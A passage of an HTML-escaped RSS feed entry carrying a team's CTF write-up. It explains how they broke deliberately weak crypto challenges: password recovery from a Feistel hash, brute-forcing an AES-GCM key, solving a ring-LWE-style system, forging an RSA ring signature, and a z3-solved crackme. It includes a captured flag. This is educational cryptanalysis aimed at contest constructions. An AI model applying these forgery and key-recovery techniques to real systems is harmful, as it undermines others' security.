&lt;/ol&gt;

&lt;p&gt;The assumption applies on $h_L(\cdot)$ as well. Thus we have&lt;/p&gt;

&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;$s_5 \oplus t_5 = s_8 \oplus t_8$, and&lt;/li&gt;
&lt;li&gt;$s_6 \oplus t_6 = s_9 \oplus t_9$.&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&#34;alert info&#34;&gt;
  If we define $L_0, R_0$ by $a_0, a_1, &amp;hellip;, a_9$ and $L_{16}, R_{16}$ by $b_0, b_1, &amp;hellip;, b_9$ (their lengths are respectively equal to $s_0, s_1, &amp;hellip;, s_9$), we still have the below properties:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;$b_0 \oplus b_3 = a_0 \oplus a_3$,&lt;/li&gt;
&lt;li&gt;$b_1 \oplus b_4 = a_1 \oplus a_4$,&lt;/li&gt;
&lt;li&gt;$b_5 \oplus b_8 = a_5 \oplus a_8$, and&lt;/li&gt;
&lt;li&gt;$b_6 \oplus b_9 = a_6 \oplus a_9$.&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
  

&lt;h4 id=&#34;part-ii-what-does-it-mean&#34;&gt;Part II: What does it mean?&lt;/h4&gt;

&lt;p&gt;Let&#39;s look back how $L_0, R_0$ is defined - $\text{password}\ |\ \text{salt}\ |\ \text{password}$. This gives us two more properties:&lt;/p&gt;

&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;$a_0 = a_7, a_1 = a_8, a_2 = a_9$ (derived from passwords), and&lt;/li&gt;
&lt;li&gt;we can control the values of $a_3, a_4, a_5, a_6$.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;So... assuming that $h_L$ and $h_R$ uses solely the 20-byte hash algorithms, we can effectively find the password (namely $a_0, a_1, a_2$):&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;$a_0 = a_3 \oplus b_0 \oplus b_3$,&lt;/li&gt;
&lt;li&gt;$a_1 = a_4 \oplus b_1 \oplus b_4$ and&lt;/li&gt;
&lt;li&gt;$a_2 = a_9 = a_6 \oplus b_6 \oplus b_9$.&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;part-iii-but-the-assumption-is-too-good-to-be-true&#34;&gt;Part III: But the assumption is &lt;em&gt;too&lt;/em&gt; good to be true!&lt;/h4&gt;

&lt;p&gt;As stated from the title, the assumption is quite hard to satisfy. What we need is, in each of the 16 rounds, $h_L$ and $h_R$ needs to pick an 20-byte hash algorithm instead of the 32-byte hash algorithm... Very difficult isn&#39;t it?&lt;/p&gt;

&lt;p&gt;The answer is &lt;em&gt;not really&lt;/em&gt;. The probability to use 20-byte hash algorithms all along is $0.75^{32}\approx 0.000145257$, which is approximately one out of 10000. We can visit the oracle 10 times, in average, to compute the password from the hash algorithm.&lt;/p&gt;

&lt;p&gt;It is very easy to know when we had the hash algorithm. From properties 2 and 3, we have:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[b_1 \oplus b_4 \oplus b_5 \oplus b_8 = a_1 \oplus a_4 \oplus a_5 \oplus a_8 = a_4 \oplus a_5.\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Writing the exploit script solving the challenge, we have the flag: &lt;code&gt;PTBCTF{420199e572e685af8e1782fde58fd0e9}&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;avec-cryptanalysis-856-points&#34;&gt;Avec? (Cryptanalysis; 856 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;harrier&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;challenge-summary-1&#34;&gt;Challenge Summary&lt;/h3&gt;

&lt;p&gt;This is a interesting question where we are given a ciphertext, encrypted using AES-GCM, with key and nonce generated by &lt;code&gt;polish_key(os.urandom(8))&lt;/code&gt; and concat itself.
The key and nonce is not provided though, so we have to somehow reverse the &lt;code&gt;polish_key&lt;/code&gt; process to know more about the key and nonce.&lt;/p&gt;

&lt;h3 id=&#34;solution-1&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;I first thought this is a GCM nonce collision problem, but the 12 bytes nonce and nonce generation rejects this thought.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;polish_key&lt;/code&gt; function is the following:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;polish_key&lt;/span&gt;(key):
	key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes_to_long(key[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
	key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GF(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fetch_int(key)
	key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; key &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xbcafffff435&lt;/span&gt;
	key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; long_to_bytes( key&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;integer_representation() )[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
	&lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; len(key) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; key&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Which &lt;code&gt;0xbcafffff435&lt;/code&gt; is can be factored into $3\times5\times7\times257\times3019\times65537$. Knowing that $3^{32} - 1 = 3\times5\times7\times257\times65537$, the key is of order $3^{32}+1$ (or a factor of it). Hence, the entropy for key and nonce are 32 bits. Exhausting both of them at the same time requires $2^{64}$ trials... or really?&lt;/p&gt;

&lt;p&gt;Because the cipher is under GCM and with a known AAD, given a key $k$ and a ciphertext $c$, we can compute $\text{GHASH}_{k,c}(\text{AAD})$.&lt;/p&gt;

&lt;p&gt;Consider the GCM mode with its tag generation. The tag generation is given by $\text{tag} = E_k(\text{nonce}) \oplus \text{GHASH}_{k,c}(\text{AAD})$. Therefore, with known key $k$, one can find out the key-correspondent nonce by $\text{nonce} = D_k(\text{tag} \oplus \text{GHASH}_{k,c}(\text{AAD}))$.&lt;/p&gt;

&lt;p&gt;Therefore we can exhaust the key $k$ with $2^{32} + 1$ trials, for each key $k$ find its corresponding $nonce$ and see whether it is the correct one.&lt;/p&gt;

&lt;p&gt;We can even make it quickly by identifying the $\text{nonce}$ should end with &lt;code&gt;\x00\x00\x00\x01&lt;/code&gt; with this method, as it is using a 12-byte nonce.&lt;/p&gt;

&lt;p&gt;We initially use Sage to deal with the challenge, but it was way too slow (to generate the possible keys) and decided to use Python instead. But we don&#39;t want to use other language other than Sage to generate the keys...&lt;/p&gt;

&lt;p&gt;So what we have done is a simple multi-thread Sage key generator and a Python solver. And it was &lt;em&gt;wayyyyyyyyyyyy&lt;/em&gt; too slow... even with pypy.&lt;/p&gt;

&lt;p&gt;Both the key generator and the pypy solver are terribly slow. I cannot find a simple GHASH implementation to do the brute-forcing part. Computing $2^{16}$ keys takes me more than 3 mins in pypy... I just wanted to use something fast to test through the keys. BearSSL saids it can process &amp;gt;1000MBps according to its &lt;a href=&#34;https://www.bearssl.org/speed.html&#34;&gt;benchmark&lt;/a&gt;. Maybe I should use a language with fast compiled code.&lt;/p&gt;

&lt;p&gt;I am a Rustacean, so why not to do it in Rust? The result is blazingly fast. It could be solved within an hour with a 64-core computer (from one of my teammates). Sage was then the bottleneck, and thus I did not bother to improve the performance of the Rust solver.&lt;/p&gt;

&lt;p&gt;I should use Rust to generate keys to speedup the whole thing, but anyway, we solved it! :)&lt;/p&gt;

&lt;h2 id=&#34;wrong-ring-cryptanalysis-936-points&#34;&gt;Wrong Ring (Cryptanalysis; 936 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;challenge-summary-2&#34;&gt;Challenge Summary&lt;/h3&gt;

&lt;p&gt;I personally see this is a cumbersome math. One of my teammates pointed out that this is similar to a &lt;em&gt;ring-LWE&lt;/em&gt;. But anyway, knowing that is a &lt;em&gt;ring-LWE&lt;/em&gt; does not help much.&lt;/p&gt;

&lt;p&gt;Okay, let&#39;s get back on track. A secret polynomial, $S$, is generated to derive the key. We are given eight polynomial pairs of $(A_k, B_k)$ such that $B_k(x) \equiv A_k(x)S(x) + \varepsilon_k(x)\ (\text{mod}\ p(x))$, where $\varepsilon_k$ is an error polynomial and $p(x) = x^{256} + 1486$.&lt;/p&gt;

&lt;h3 id=&#34;solution-2&#34;&gt;Solution&lt;/h3&gt;

&lt;h4 id=&#34;part-i-complicating-the-problem-a-bit&#34;&gt;Part I: Complicating the problem a bit&lt;/h4&gt;

&lt;p&gt;Let&#39;s make the polynomial concrete! Define:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[A_k(x) = \sum_{i=0}^{255} a_{ki} x^i, B_k(x) = \sum_{i=0}^{255} b_{ki} x^i, \varepsilon_k(x) = \sum_{i=0}^{255} e_{ki} x^i, S(x) = \sum_{i=0}^{255} s_i x^i.\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;$a_{ki}, b_{ki}, s_i$ are all integers in the set $[0, 1486]$, while $e_{ki}$ are small real numbers.&lt;/p&gt;

&lt;p&gt;Then we have&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[\begin{aligned}
\sum_{i=0}^{255} b_{ki} x^i &amp;\equiv \left(\sum_{i=0}^{255} a_{ki} x^i\right)\left(\sum_{i=0}^{255} s_i x^i\right) + \sum_{i=0}^{255} e_i x^i \\
&amp;\equiv \sum_{i=0}^{510}\left(\sum_{j=\text{max}(0,i-255)}^{\text{min}(255,i)} a_{kj}s_{i-j}\right)x^i + \sum_{i=0}^{255} e_i x^i \\
&amp;\equiv \sum_{i=0}^{255}\left(\sum_{j=\text{max}(0,i-255)}^{\text{min}(255,i)} a_{kj}s_{i-j}\right)x^i + \sum_{i=256}^{510}\left(\sum_{j=\text{max}(0,i-255)}^{\text{min}(255,i)} a_{kj}s_{i-j}\right)x^i + \sum_{i=0}^{255} e_i x^i \\
&amp;\equiv \sum_{i=0}^{255}\left(\sum_{j=0}^i a_{kj}s_{i-j}\right)x^i + \sum_{i=256}^{510}\left(\sum_{j=i-255}^{255} a_{kj}s_{i-j}\right)x^i + \sum_{i=0}^{255} e_i x^i \\
&amp;\equiv \sum_{i=0}^{255}\left(\sum_{j=0}^i a_{kj}s_{i-j}\right)x^i - 1486\sum_{i=256}^{510}\left(\sum_{j=i-255}^{255} a_{kj}s_{i-j}\right)x^{i-256} + \sum_{i=0}^{255} e_i x^i \\
&amp;\equiv \sum_{i=0}^{255}\left(\sum_{j=0}^i a_{kj}s_{i-j}\right)x^i - 1486\sum_{i=0}^{254}\left(\sum_{j=i+1}^{255} a_{kj}s_{i-j+256}\right)x^{i} + \sum_{i=0}^{255} e_i x^i \\
&amp;\equiv \sum_{i=0}^{255}\left(\sum_{j=0}^i a_{kj}s_{i-j} - 1486 \sum_{j=i+1}^{255} a_{kj}s_{i-j+256} + e_i\right)x^i \\
&amp;\equiv \sum_{i=0}^{255}\left(\sum_{j=0}^i a_{k,{i-j}}s_j - 1486 \sum_{j=i+1}^{255} a_{k,i-j+256}s_j + e_i\right)x^i
\end{aligned}\]&lt;/span&gt;&lt;/p&gt;

&lt;div class=&#34;alert info&#34;&gt;
  &lt;strong&gt;Explanations:&lt;/strong&gt;
Under modulo $p(x)$, $x^{256} = -1486$ - so we have $$\sum_{i=256}^{510}\left(\sum_{j=i-255}^{255} a_{kj}s_{i-j}\right)x^i = - 1486\sum_{i=256}^{510}\left(\sum_{j=i-255}^{255} a_{kj}s_{i-j}\right)x^{i-256}.$$
&lt;/div&gt;
  

&lt;p&gt;Very complicated right? Yes... But we have a conclusion for this part:&lt;/p&gt;

&lt;div class=&#34;alert success&#34;&gt;
  For each $i = 0, 1, &amp;hellip;, 255$ and $k = 1, 2, &amp;hellip;, 8$, we have:
$$b_{ki} = \sum_{j=0}^i a_{k,{i-j}}s_j - 1486 \sum_{j=i+1}^{255} a_{k,i-j+256}s_j + e_i.$$
&lt;/div&gt;
  

&lt;h4 id=&#34;part-ii-an-insight&#34;&gt;Part II: An insight&lt;/h4&gt;

&lt;p&gt;I have noticed that the coefficients for $x^{240}, x^{241}, ..., x^{255}$ in the error polynomial would be very small (less than 0.1 in magnitude). So why don&#39;t we compare the coefficients directly?&lt;/p&gt;

&lt;p&gt;For each $i = 240, 241, ..., 255$ and $k = 1, 2, ..., 8$, we have a corresponding equation:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[\text{round}(b_{ki}) = \sum_{j=0}^i a_{k,{i-j}}s_j - 1486 \sum_{j=i+1}^{255} a_{k,i-j+256}s_j.\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Since there are 256 unknowns ($s_0, s_1, ..., s_{255}$) and 256 equations, we can hopefully solve the equation. This gives us the key, hence the flag.&lt;/p&gt;

&lt;h2 id=&#34;lotr-cryptanalysis-936-points&#34;&gt;LOTR (Cryptanalysis; 936 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;challenge-summary-3&#34;&gt;Challenge Summary&lt;/h3&gt;

&lt;p&gt;This is an attempt to implement an anonymous signature scheme using RSA. In short, given $m$ parties with public keys being $n_1, n_2, ..., n_m$, the signature generated by this group is defined by $(c_1, c_2, ..., c_m)$, where&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[\sum_{k=1}^m \text{RSAEncrypt}(c_k, n_k)\equiv\text{hash}\ (\text{mod}\ 2^{256}),\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;and $2^{2175} + 2^{2048} \leq c_k \leq 2^{2176} - 2^{2048}$ for each of the $k$&#39;s.&lt;/p&gt;

&lt;p&gt;There is a catch: if $c = qn + r$ with $0 \leq r &amp;lt; q$, $\text{RSAEncrypt}(c, n) = qn + [r^e\ (\text{mod}\ n)]$.&lt;/p&gt;

&lt;h3 id=&#34;solution-3&#34;&gt;Solution&lt;/h3&gt;

&lt;h4 id=&#34;part-i-simplify-the-challenge-as-much-as-possible&#34;&gt;Part I: Simplify the challenge &lt;em&gt;as much as possible&lt;/em&gt;&lt;/h4&gt;

&lt;p&gt;$\text{RSAEncrypt}(qn + r, n) = qn + [r^e\ (\text{mod}\ n)]$ is cumbersome. Why don&#39;t we just assume $r = 0$ so that $\text{RSAEncrypt}$ is just an identity function?&lt;/p&gt;

&lt;h4 id=&#34;part-ii-the-main-dish&#34;&gt;Part II: The main dish&lt;/h4&gt;

&lt;div class=&#34;alert info&#34;&gt;
  &lt;strong&gt;Note:&lt;/strong&gt; The $c_k$ and $c_k&#39;$ defined below are multiples of $n_k$. This is what we had from the above part for the simplicity&amp;rsquo;s sake.
&lt;/div&gt;
  

&lt;p&gt;My approach is to generate two ciphertexts, namely, $c_k$ and $c_k&#39;$ for the $k$-th party. In this way, we have 243 ciphertext pairs. We are looking for $x_1, x_2, ..., x_{243}\in{0, 1}$ such that&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[\bigoplus_{k=1}^m [(1 - x_k) \text{RSAEncrypt}(c_k, n_k) + x_k \text{RSAEncrypt}(c_k&#39;, n_k)] \equiv \text{hash}\ (\text{mod}\ 2^{256}).\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Simplifying, we have:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[\bigoplus_{k=1}^m [x_k (c_k - c_k&#39;)] \equiv \text{hash} \oplus \bigoplus_{k=1}^m c_k\ (\text{mod}\ 2^{256}).\]&lt;/span&gt;&lt;/p&gt;

&lt;div class=&#34;alert info&#34;&gt;
  &lt;strong&gt;Idea:&lt;/strong&gt; My approach is to check if one of the $2^{243}$ possible generated ciphertexts covers the target hash. If not, generate another set.
&lt;/div&gt;
  

&lt;p&gt;The above equation is just an linear equation! Solving it we had the values of $x_k$&#39;s. If $x_k = 0$ we pick $c_k$, and $c_k&#39;$ otherwise. After all we have forged a signature.&lt;/p&gt;

&lt;h2 id=&#34;primitive-obsession-reverse-engineering-936-points&#34;&gt;Primitive Obsession (Reverse Engineering; 936 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;challenge-summary-4&#34;&gt;Challenge Summary&lt;/h3&gt;

&lt;p&gt;This is a crackme with a 260-byte long input. Conditions involves basic math operations after casting some of the bytes into various types.&lt;/p&gt;

&lt;h3 id=&#34;solution-4&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;My first thought is to use Angr! Unfortunately I am not a good Angr user - so it took me a long while to give up. I have finally adopted an &lt;em&gt;ultra-naive&lt;/em&gt; approach...&lt;/p&gt;

&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2019-10-02-pwnthybytes/ida.png&#34;/&gt; 
&lt;/figure&gt;


&lt;p&gt;That is, I have extracted the expressions one by one &lt;em&gt;manually&lt;/em&gt; and pass them to z3. After all, I admit my stupidity - it took me &lt;em&gt;six&lt;/em&gt; hours to solve it...&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>
